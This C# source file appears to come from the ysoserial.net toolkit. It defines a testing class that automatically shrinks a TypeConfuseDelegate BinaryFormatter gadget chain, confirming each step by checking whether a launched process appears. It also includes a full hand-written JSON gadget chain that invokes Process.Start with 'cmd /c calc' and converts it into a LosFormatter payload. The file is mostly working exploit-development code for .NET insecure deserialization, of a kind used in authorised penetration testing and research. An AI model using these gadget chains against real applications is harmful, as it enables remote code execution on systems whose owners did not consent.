using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using NDesk.Options;
using ysoserial.Generators;
using ysoserial.Helpers.ModifiedVulnerableBinaryFormatters;
using System.IO;
using System.Diagnostics;
using Newtonsoft.Json.Linq;
using System.Text.RegularExpressions;

namespace ysoserial.Helpers.TestingArena
{
    // This can be used for testing purposes
    // Some samples have been included here
    class TestingArenaHome : GenericGenerator
    {
        private InputArgs inputArgs = new InputArgs();
        private InputArgs sampleInputArgs = new InputArgs("cmd /c calc", true, false, false, false, true, null);
        private string testarg = "";

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"testarg", "This is a new string argument as an example", v => v = testarg},
            };

            return options;
        }

        public void Start(InputArgs inputArgs)
        {
            this.inputArgs = inputArgs;
            //ManualTCDGPayload4Minifying();
            MinimiseTCDJsonAndRun();
            Console.ReadLine();
        }

        // this has been used as an example to minify the TypeConfuseDelegateGenerator payload!
        private void MinimiseTCDJsonAndRun()
        {
            string myApp = "TestConsoleApp";
            sampleInputArgs = new InputArgs(myApp + " /foo bar", true, false, false, false, true, null);
            bool isErrOk = false;
            
            TypeConfuseDelegateGenerator tcdg = new TypeConfuseDelegateGenerator();
            byte[] tcd_bf_byte = (byte[])tcdg.GenerateWithNoTest("binaryformatter", sampleInputArgs);
            string json_string = AdvancedBinaryFormatterParser.StreamToJson(new MemoryStream(tcd_bf_byte), false, true, true);
            
            string oldJson_string = json_string;
            string result = "";
            int counter = 1;
            while (result != oldJson_string)
            {
                Console.WriteLine("=====> running counter: " + counter++);
                if (result != "")
                    oldJson_string = result;
                result = MinimiseJsonAndRun(oldJson_string, sampleInputArgs, isErrOk);
                Console.WriteLine("\r\n\r\n");
            }

            // removing spaces between array items
            result = Regex.Replace(result, @"\:\s*\[[a-z\sA-Z0-9\,\[\]""'\+\._`]+\],", delegate (Match m)
            {
                String finalVal = m.Value;
                finalVal = Regex.Replace(finalVal, @"\s+", "");
                return finalVal;
            });

            // removing spaces between non-alphanumerical characters at the beginning of each clause
            result = Regex.Replace(result, @"^\s*([^\w""':. ][^\w""']+)+", delegate (Match m)
            {
                String finalVal = m.Value;
                finalVal = Regex.Replace(finalVal, @"\s+", "");
                return finalVal;
            }, RegexOptions.Multiline);

            Console.WriteLine(result);
            Console.ReadLine();
        }

        private string MinimiseJsonAndRun(string json_string, InputArgs inInputArgs, bool isErrOk)
        {
            string myApp = inInputArgs.CmdFileName;

            JArray jsonJArrayObj = JArray.Parse(json_string);

            if (!BinaryFormatterDeserializeABFJson(json_string))
            {
                isErrOk = true;
            }

            if (KillMyProcess(myApp))
            {
                // rules:
                // remove a Data object
                // replace a string with null
                // replace a non empty string with an empty string ('')
                // replace a non empty string greater than one character with one character ('x')
                // replace space in string if it contains a space
                // replace a full class or assembly string to only keep class - then class and assembly
                // replace an integer with 0 to N - when int is M and N < M && N < 20 (we need a limit)

                StringBuilder sbSuccessResult = new StringBuilder();

                sbSuccessResult.Append(DataObjectRemovalTester(ref jsonJArrayObj, myApp, isErrOk));
                // TODO: do we need to repeat object removal? and all this? if yes, can we do it recursively by just calling this funcion?

                // replace a string with null
                // replace a non empty string with an empty string ('')
                // replace a non empty string greater than one character with one character ('x')
                // replace space in string if it contains a space
                // replace a full class or assembly string to only keep class - then class and assembly
                // replace an integer with 0 to N - when int is M and N < M && N < 20 (we need a limit)
                List<String> typeExclusionList = new List<string> { "SerializationHeaderRecord", "MessageEnd" };
                List<String> nameExclusionList = new List<string> { "$type", "objectId" };
                List<String> valueExclusionList = new List<string> { inInputArgs.CmdFullString, inInputArgs.CmdFileName, inInputArgs.CmdArguments, inInputArgs.CmdFromFile };

                JArray origJsonJArrayObj = new JArray(jsonJArrayObj.ToList().ToArray());
                bool ruleComplete = false;
                while (!ruleComplete)
                {
                    int internalCounter = 0;

                    foreach (JObject item in jsonJArrayObj)
                    {
                        internalCounter++;
                        JToken dataItem = item["Data"];
                        foreach (JProperty subDataItem in dataItem)
                        {
                            string subDataItemName = subDataItem.Name;
                            JToken subDataItemValue = subDataItem.Value;
                            JTokenType subDataItemType = subDataItem.Value.Type;

                            if (subDataItemName.Equals("$type"))
                            {
                                if (subDataItemValue.ToString().Equals("MessageEnd"))
                                {
                                    ruleComplete = true;
                                    break;
                                }

                                if (typeExclusionList.Contains(subDataItemValue.ToString()))
                                {
                                    break;
                                }
                            }

                            if (nameExclusionList.Contains(subDataItemName) || valueExclusionList.Contains(subDataItemValue.ToString()))
                                continue;

                            switch (subDataItemType)
                            {
                                case JTokenType.String:
                                case JTokenType.Integer:
                                    sbSuccessResult.Append(RulesRunner(ref jsonJArrayObj, subDataItem, myApp, isErrOk));
                                    break;
                                case JTokenType.Null:
                                    // do nothing!
                                    break;
                                case JTokenType.Array:
                                    // we will have string, int, and null again (never another Array in this case) -> we care about int and string

                                    // check if the whole array can be replaced with null
                                    sbSuccessResult.Append(RulesRunner(ref jsonJArrayObj, subDataItem, -1, myApp, isErrOk));

                                    if (subDataItem.Value != null)
                                    {
                                        // this is when it could not be null by the previous rule

                                        // first we need to remove items within the array to see which one can be safely removed


                                        int externalArrayCounter = 0;
                                        while (externalArrayCounter < subDataItem.Value.ToList().Count)
                                        {
                                            var origArrayList = subDataItem.Value.ToList();
                                            var newArrayList = subDataItem.Value.ToList();

                                            if (!valueExclusionList.Contains(newArrayList[externalArrayCounter].ToString()))
                                            {
                                                newArrayList.RemoveAt(externalArrayCounter);
                                                subDataItem.Value = new JArray(newArrayList);

                                                if (CheckIfSuccess(jsonJArrayObj.ToString(), myApp, isErrOk))
                                                {
                                                    // it is a success so we can remove it!
                                                    externalArrayCounter--;
                                                    sbSuccessResult.AppendLine("Successful in removing:" + newArrayList + " - item: " + externalArrayCounter);
                                                }
                                                else
                                                {
                                                    //undo
                                                    subDataItem.Value = new JArray(origArrayList);
                                                }
                                            }
                                            externalArrayCounter++;
                                        }

                                        int counter = 0;
                                        foreach (JToken subArrayItem in subDataItem.Value.ToList())
                                        {
                                            JToken arrayItemValue = subArrayItem;
                                            JTokenType arrayItemType = subArrayItem.Type;

                                            if (valueExclusionList.Contains(arrayItemValue.ToString()))
                                                continue;

                                            switch (arrayItemType)
                                            {
                                                case JTokenType.String:
                                                case JTokenType.Integer:
                                                    sbSuccessResult.Append(RulesRunner(ref jsonJArrayObj, subDataItem, counter, myApp, isErrOk));
                                                    break;
                                                default:
                                                    break;
                                            }
                                            counter++;
                                        }

                                    }

                                    break;
                                default:
                                    RulesRunner(ref jsonJArrayObj, subDataItem, myApp, isErrOk);
                                    break;
                            }
                        }

                        if (ruleComplete)
                            break;
                    }
                }


                //*                
                Console.WriteLine(sbSuccessResult);
                //*/

                /*
                var resultString = jsonJArrayObj.ToString();
                Console.WriteLine(resultString);
                */

            }
            else
            {
                Console.WriteLine("Ivalid test case!");
            }

            return jsonJArrayObj.ToString();
        }

        private StringBuilder DataObjectRemovalTester(ref JArray jsonJArrayObj, string myApp, bool isErrOk)
        {
            JArray origJsonJArrayObj = new JArray(jsonJArrayObj.ToList().ToArray());
            string json_shortened = origJsonJArrayObj.ToString();
            bool ruleComplete = false;

            StringBuilder sbSuccessResult = new StringBuilder();

            // remove a Data object
            ruleComplete = false;
            int externalCounter = 0;
            while (!ruleComplete)
            {
                int internalCounter = 0;

                foreach (JObject item in origJsonJArrayObj)
                {
                    internalCounter++;
                    JToken dataItem = item["Data"];
                    foreach (JProperty subDataItem in dataItem)
                    {
                        string subDataItemName = subDataItem.Name;
                        JToken subDataItemValue = subDataItem.Value;
                        JTokenType subDataItemType = subDataItem.Value.Type;
                        if (subDataItemName.Equals("$type"))
                        {
                            if (subDataItemValue.ToString().Equals("MessageEnd"))
                            {
                                ruleComplete = true;
                            }
                            break;
                        }
                    }

                    if (!ruleComplete && internalCounter > externalCounter)
                    {
                        string tempValue = item.ToString();
                        item.Remove();


                        if (CheckIfSuccess(origJsonJArrayObj.ToString(), myApp, isErrOk))
                        {
                            // it is a success so we can remove it!
                            // we have to start from the beginning!
                            externalCounter = 0;
                            jsonJArrayObj = new JArray(origJsonJArrayObj.ToList().ToArray());
                            sbSuccessResult.AppendLine("Successful in removing:" + tempValue);
                        }
                        else
                        {
                            // we should not remove it
                            externalCounter = internalCounter;
                            origJsonJArrayObj = new JArray(jsonJArrayObj.ToList().ToArray());
                        }

                        break;
                    }
                }
            }


            return sbSuccessResult;
        }

        private StringBuilder RulesRunner(ref JArray jsonJArrayObj, JProperty currentPropItem, string myApp, bool isErrOk)
        {
            return RulesRunner(ref jsonJArrayObj, currentPropItem, -1, myApp, isErrOk);
        }

        private StringBuilder RulesRunner(ref JArray jsonJArrayObj, JProperty currentPropItem, int arrNum, string myApp, bool isErrOk)
        {
            StringBuilder sbSuccessResult = new StringBuilder();
            var origCurrentItem = currentPropItem.Value.DeepClone();
            JTokenType currentItemType = currentPropItem.Value.Type;

            if (currentItemType == JTokenType.Array)
            {
                if ((arrNum) > -1)
                {
                    // we are dealing with an array item
                    currentItemType = currentPropItem.Value[arrNum].Type;
                }
            }

            switch (currentItemType)
            {
                case JTokenType.String:
                    string origValue = currentPropItem.Value.ToString();

                    if (arrNum > -1)
                    {
                        origValue = currentPropItem.Value[arrNum].ToString();
                    }

                    // replace a string with null
                    if (arrNum == -1)
                    {
                        currentPropItem.Value = null;
                    }
                    else
                    {
                        currentPropItem.Value[arrNum] = null;
                    }

                    if (CheckIfSuccess(jsonJArrayObj.ToString(), myApp, isErrOk))
                    {
                        //success
                        sbSuccessResult.AppendLine("String replaced with null: " + origValue);
                        break;
                    }

                    // undo
                    currentPropItem.Value = origCurrentItem.DeepClone();

                    if (!string.IsNullOrEmpty(origValue))
                    {
                        // replace a non empty string with an empty string ('')
                        if (arrNum == -1)
                        {
                            currentPropItem.Value = "";
                        }
                        else
                        {
                            currentPropItem.Value[arrNum] = "";
                        }


                        if (CheckIfSuccess(jsonJArrayObj.ToString(), myApp, isErrOk))
                        {
                            //success
                            sbSuccessResult.AppendLine("String replaced with empty: " + origValue);
                            break;
                        }

                        // undo
                        currentPropItem.Value = origCurrentItem.DeepClone();

                        if (origValue.Length > 1)
                        {
                            // replace a non empty string greater than one character with one character ('x')
                            if (arrNum == -1)
                            {
                                currentPropItem.Value = "x";
                            }
                            else
                            {
                                currentPropItem.Value[arrNum] = "x";
                            }

                            if (CheckIfSuccess(jsonJArrayObj.ToString(), myApp, isErrOk))
                            {
                                //success
                                sbSuccessResult.AppendLine("String replaced with 'x': " + origValue);
                                break;
                            }

                            // undo
                            currentPropItem.Value = origCurrentItem.DeepClone();

                            if (origValue.Contains(" "))
                            {
                                // replace space in string if it contains a space    
                                if (arrNum == -1)
                                {
                                    currentPropItem.Value = origValue.Replace(" ", "");
                                }
                                else
                                {
                                    currentPropItem.Value[arrNum] = origValue.Replace(" ", "");
                                }

                                if (CheckIfSuccess(jsonJArrayObj.ToString(), myApp, isErrOk))
                                {
                                    //success
                                    origValue = currentPropItem.Value.ToString();

                                    if (arrNum > -1)
                                    {
                                        origValue = currentPropItem.Value[arrNum].ToString();
                                    }
                                    sbSuccessResult.AppendLine("Space characters removed from: " + origValue);
                                    // we shouldn't break here! we have things to do!
                                }
                                else
                                {
                                    // undo
                                    currentPropItem.Value = origCurrentItem.DeepClone();
                                }
                            }

                            origCurrentItem = currentPropItem.Value.DeepClone();

                            string newValue = origValue;

                            // replace a full class or assembly string to only keep then class and assembly
                            Regex asmSection = new Regex(@"([^,]+)\s*[,]\s*Version=[^,]+,\s*Culture=[^,]+,\s*PublicKeyToken=[a-z0-9]{16}", RegexOptions.IgnoreCase);

                            foreach (Match match in asmSection.Matches(origValue))
                            {
                                if (arrNum == -1)
                                {
                                    currentPropItem.Value = newValue.Replace(match.Value, match.Groups[1].Value);
                                }
                                else
                                {
                                    currentPropItem.Value[arrNum] = newValue.Replace(match.Value, match.Groups[1].Value);
                                }

                                if (CheckIfSuccess(jsonJArrayObj.ToString(), myApp, isErrOk))
                                {
                                    // success
                                    newValue = currentPropItem.Value.ToString();
                                    if (arrNum > -1)
                                    {
                                        newValue = currentPropItem.Value[arrNum].ToString();
                                    }
                                    sbSuccessResult.AppendLine("A class or an assembly string became shorter: " + origValue);
                                    origCurrentItem = currentPropItem.Value.DeepClone();
                                }
                            }

                            // undo
                            if (newValue.Equals(origValue))
                            {
                                // failure
                                currentPropItem.Value = origCurrentItem.DeepClone();
                            }
                            else
                            {
                                origValue = newValue;
                            }

                            origCurrentItem = currentPropItem.Value.DeepClone();

                            // replace a full class or assembly string to only keep class
                            Regex classRegex = new Regex(@"([a-z0-9\.\+_\$`]+)\s*[;,]\s*[a-z0-9\.\+_\$`]+", RegexOptions.IgnoreCase);

                            newValue = origValue;

                            foreach (Match match in classRegex.Matches(origValue))
                            {
                                if (arrNum == -1)
                                {
                                    currentPropItem.Value = newValue.Replace(match.Value, match.Groups[1].Value);
                                }
                                else
                                {
                                    currentPropItem.Value[arrNum] = newValue.Replace(match.Value, match.Groups[1].Value);
                                }

                                if (CheckIfSuccess(jsonJArrayObj.ToString(), myApp, isErrOk))
                                {
                                    // success
                                    newValue = currentPropItem.Value.ToString();
                                    if (arrNum > -1)
                                    {
                                        newValue = currentPropItem.Value[arrNum].ToString();
                                    }
                                    sbSuccessResult.AppendLine("A class or an assembly string became shorter: " + origValue);
                                    origCurrentItem = currentPropItem.Value.DeepClone();
                                }
                            }

                            // undo if failed
                            if (arrNum == -1 && !newValue.Equals(currentPropItem.Value.ToString()))
                            {
                                currentPropItem.Value = origCurrentItem.DeepClone();
                            }
                            else if (arrNum > -1 && !newValue.Equals(currentPropItem.Value[arrNum].ToString()))
                            {
                                currentPropItem.Value = origCurrentItem.DeepClone();
                            }

                        }
                    }

                    break;
                case JTokenType.Integer:
                    // replace an integer with 0 to N - when int is M and N < M && N < 20 (we need a limit)
                    var origItemValue = currentPropItem.Value.DeepClone();
                    int origIntValue = 0;

                    if (arrNum == -1)
                    {
                        int.TryParse(currentPropItem.Value.ToString(), out origIntValue);
                    }
                    else
                    {
                        int.TryParse(currentPropItem.Value[arrNum].ToString(), out origIntValue);
                    }


                    if (origIntValue > 0)
                    {
                        int intCounter = 0;

                        while (intCounter < origIntValue && intCounter < 20)
                        {

                            if (arrNum == -1)
                            {
                                currentPropItem.Value = intCounter;
                            }
                            else
                            {
                                currentPropItem.Value[arrNum] = intCounter;
                            }

                            if (CheckIfSuccess(jsonJArrayObj.ToString(), myApp, isErrOk))
                            {
                                //success
                                sbSuccessResult.AppendLine("A number was changed from: " + origIntValue + " to: " + intCounter);
                                break;
                            }
                            else
                            {
                                currentPropItem.Value = origItemValue.DeepClone();
                            }

                            intCounter++;
                        }
                    }
                    break;
                default:
                    // convert to null
                    currentPropItem.Value = null;
                    if (CheckIfSuccess(jsonJArrayObj.ToString(), myApp, isErrOk))
                    {
                        //success
                        sbSuccessResult.AppendLine("An item was replaced with null: " + origCurrentItem.ToString());
                        break;
                    }
                    // undo
                    currentPropItem.Value = origCurrentItem.DeepClone();
                    break;
            }

            return sbSuccessResult;
        }

        private bool CheckIfSuccess(string strJson, string myApp, bool isErrOk)
        {
            bool result = true;

            try
            {
                if (!BinaryFormatterDeserializeABFJson(strJson))
                {
                    if (!isErrOk)
                    {
                        // we have error but we don't like errors
                        result = false;
                    }
                }
            }
            catch
            {
                if (!isErrOk)
                {
                    // we have error but we don't like errors
                    result = false;
                }
            }


            if (!KillMyProcess(myApp))
            {
                // no app was found so the code exec did not work
                result = false;
            }

            return result;
        }

        private bool BinaryFormatterDeserializeABFJson(string strJson)
        {
            bool noError = true;
            try
            {
                MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(strJson);

                /*
                ms.Position = 0;
                BinaryFormatter bf = new BinaryFormatter();
                var task = Task.Run(() => bf.Deserialize(ms));              
                //*/

                var task = Task.Run(() => { try { SerializersHelper.BinaryFormatter_deserialize(ms.ToArray()); } catch { noError = false; } });

                if (!task.Wait(TimeSpan.FromSeconds(5)))
                {
                    noError = false;
                    Console.WriteLine("The formatter is not responding - infinite loop because of parameters.");
                }



            }
            catch
            {
                noError = false;
            }

            return noError;
        }

        private bool KillMyProcess(string myprocess)
        {
            bool processFound = false;
            foreach (Process myp in Process.GetProcessesByName(myprocess))
            {
                // It has worked
                processFound = true;
                // killing any existing TestConsoleApp to be ready
                try
                {
                    myp.Kill();
                }
                catch
                {
                    // hopefully it is just a race condition and all has been closed!!!
                    // just to be on the safe side:
                    KillMyProcess(myprocess);
                }

            }

            return processFound;
        }

        private void ManualTCDGPayload4Minifying()
        {


            /*
            sampleInputArgs.Minify = true;
            sampleInputArgs.UseSimpleType = true;

            object tcd = TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(sampleInputArgs);

            TypeConfuseDelegateGenerator tcdg = new TypeConfuseDelegateGenerator();
            byte[] tcd_bf_byte = (byte[]) tcdg.GenerateWithNoTest("binaryformatter", sampleInputArgs);
            string tcd_json = AdvancedBinaryFormatterParser.StreamToJson(new MemoryStream(tcd_bf_byte),false, true);
            Console.WriteLine(tcd_json);
            //*/

            //*
            string tcd_json = @"[{'Id': 1,
    'Data': {
      '$type': 'SerializationHeaderRecord',
      'binaryFormatterMajorVersion': 1,
      'binaryFormatterMinorVersion': 0,
      'binaryHeaderEnum': 0,
      'topId': 1,
      'headerId': -1,
      'majorVersion': 1,
      'minorVersion': 0
}},{'Id': 2,
    'TypeName': 'Assembly',
    'Data': {
      '$type': 'BinaryAssembly',
      'assemId': 2,
      'assemblyString': 'System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089'
}},{'Id': 3,
    'TypeName': 'ObjectWithMapTypedAssemId',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 5,
      'objectId': 1,
      'name': 'System.Collections.Generic.SortedSet`1[[System.String,mscorlib]]',
      'numMembers': 4,
      'memberNames':['Count','Comparer','Version','Items'], /*Version can be replaced with an empty string but it causes error after code execution*/
      'binaryTypeEnumA':[0,3,0,6],
      'typeInformationA':[8,null,8,null],
      'typeInformationB':[8,'', 8, null],
      'memberAssemIds':[0,0,0,0],
      'assemId': 2
}},{'Id': 4,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 2
}},{'Id': 5,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 3
}},{'Id': 6,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 2
}},{'Id': 7,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 4
}},{'Id': 8,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 3,
      'name': 'System.Collections.Generic.ComparisonComparer`1[[System.String]]',
      'numMembers': 1,
      'memberNames':['_comparison'],
      'binaryTypeEnumA':[3],
      'typeInformationA':[null],
      'typeInformationB':[''],
      'memberAssemIds':[0],
      'assemId': 0
}},{'Id': 9,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 5
}},{'Id': 10,
    'TypeName': 'ArraySingleString',
    'Data': {
      '$type': 'BinaryArray',
      'objectId': 4,
      'rank': 1,
      'lengthA':[2],
      'lowerBoundA':[0],
      'binaryTypeEnum': 1,
      'typeInformation': null,
      'assemId': 0,
      'binaryHeaderEnum': 17,
      'binaryArrayTypeEnum': 0
}},{'Id': 11,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 6,
      'value': '/c calc'
}},{'Id': 12,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 7,
      'value': 'cmd'
}},{'Id': 13,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 5,
      'name': 'System.DelegateSerializationHolder',
      'numMembers': 3,
      'memberNames':['Delegate','method0',''],
      'binaryTypeEnumA':[3,3,3],
      'typeInformationA':[null,null,null],
      'typeInformationB':['','',''],
      'memberAssemIds':[0,0,0],
      'assemId': 0
}},{'Id': 14,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 8
}},{'Id': 15,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 9
}},{'Id': 16,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 10
}},{'Id': 17,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 8,
      'name': 'System.DelegateSerializationHolder+DelegateEntry',
      'numMembers': 7,
      'memberNames':['type','assembly','','targetTypeAssembly','targetTypeName','methodName','delegateEntry'],
      'binaryTypeEnumA':[1,1,2,1,1,1,3],
      'typeInformationA':[null,null,null,null,null,null,null],
      'typeInformationB':[null,null,null,null,null,null,''],
      'memberAssemIds':[0,0,0,0,0,0,0],
      'assemId': 0
}},{'Id': 18,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 11,
      'value': 'System.Func`3[[System.String],[System.String],[System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089]]'
}},{'Id': 19,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 12,
      'value': 'mscorlib'
}},{'Id': 20,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 1
}},{'Id': 21,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 13,
      'value': 'System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089'
}},{'Id': 22,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 14,
      'value': 'System.Diagnostics.Process'
}},{'Id': 23,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 15,
      'value': 'Start'
}},{'Id': 24,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 16
}},{'Id': 25,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 9,
      'name': 'System.Reflection.MemberInfoSerializationHolder',
      'numMembers': 6,
      'memberNames':['Name','AssemblyName','ClassName','Signature','MemberType',''],
      'binaryTypeEnumA':[1,1,1,1,0,3],
      'typeInformationA':[null,null,null,null,8,null],
      'typeInformationB':[null,null,null,null,8,''
],'memberAssemIds':[0,0,0,0,0,0],
      'assemId': 0
}},{'Id': 26,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 15
}},{'Id': 27,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 13
}},{'Id': 28,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 14
}},{'Id': 29,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 20,
      'value': 'System.Diagnostics.Process Start(System.String, System.String)'
}},{'Id': 30,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 8
}},{'Id': 31,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 1
}},{'Id': 32,
    'TypeName': 'Object',
    'Data': {
      '$type': 'BinaryObject',
      'objectId': 10,
      'mapId': 9
}},{'Id': 33,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 21,
      'value': 'Compare'
}},{'Id': 34,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 12
}},{'Id': 35,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 23,
      'value': 'System.String'
}},{'Id': 36,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 24,
      'value': 'Int32 Compare(System.String, System.String)'
}},{'Id': 37,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 8
}},{'Id': 38,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 1
}},{'Id': 39,
    'TypeName': 'Object',
    'Data': {
      '$type': 'BinaryObject',
      'objectId': 16,
      'mapId': 8
}},{'Id': 40,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 25,
      'value': 'System.Comparison`1[[System.String]]'
}},{'Id': 41,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 12
}},{'Id': 42,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 1
}},{'Id': 43,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 12
}},{'Id': 44,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 23
}},{'Id': 45,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 21
}},{'Id': 47,
    'TypeName': 'MessageEnd',
    'Data': {
      '$type': 'MessageEnd'
}}]";

            MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(tcd_json);
            try
            {
                string lfStr = Encoding.UTF8.GetString(SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms).ToArray());
                Console.WriteLine("Length: " + lfStr.Length);
                SerializersHelper.LosFormatter_deserialize(lfStr);
            }
            catch
            {
                Console.WriteLine("Error");
            }

            //*/

        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            throw new NotImplementedException();
        }

        public override string Finders()
        {
            throw new NotImplementedException();
        }

        public override string Name()
        {
            throw new NotImplementedException();
        }

        public override List<string> SupportedFormatters()
        {
            throw new NotImplementedException();
        }
    }
}
